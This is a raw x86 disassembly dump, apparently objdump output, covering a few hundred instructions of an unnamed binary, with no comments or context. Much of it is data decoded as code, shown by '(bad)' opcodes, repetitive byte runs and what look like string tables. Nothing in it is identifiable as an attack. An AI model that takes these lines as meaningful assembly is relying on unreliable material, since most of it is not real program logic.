  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	mov    bl,0x1e
  433a5a:	pop    esi
  433a5b:	mov    eax,0x442ce815
  433a60:	or     BYTE PTR [ecx+0x3f],0x85
  433a64:	xchg   ebx,eax
  433a65:	stos   DWORD PTR es:[edi],eax
  433a66:	and    al,0xc8
  433a68:	sbb    eax,DWORD PTR [eax]
  433a6a:	add    BYTE PTR [eax],al
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
